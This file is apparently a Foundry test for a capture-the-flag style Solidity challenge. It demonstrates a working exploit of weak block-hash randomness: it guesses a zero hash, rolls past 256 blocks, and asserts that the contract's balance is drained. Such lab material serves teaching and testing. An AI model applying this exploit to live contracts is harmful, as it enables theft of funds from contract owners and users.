
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 2 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber >= block.number + 257);
        vm.assume(blockNumber <= type(uint256).max - 1);

        bytes32 predictableHash = bytes32(0);

        vm.deal(address(this), 1 ether);
        _contractUnderTest.lockInGuess{value: 1 ether}(predictableHash);

        vm.roll(blockNumber);

        bytes32 answer = blockhash(blockNumber - 256);
        assertEq(answer, predictableHash, "Blockhash should be predictable (zero after 256 blocks)");

        uint256 initialBalance = address(this).balance;
        _contractUnderTest.settle();
        uint256 finalBalance = address(this).balance;

        assertEq(finalBalance, initialBalance + 2 ether, "Should win by predicting zero blockhash");
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be emptied");
    }
}
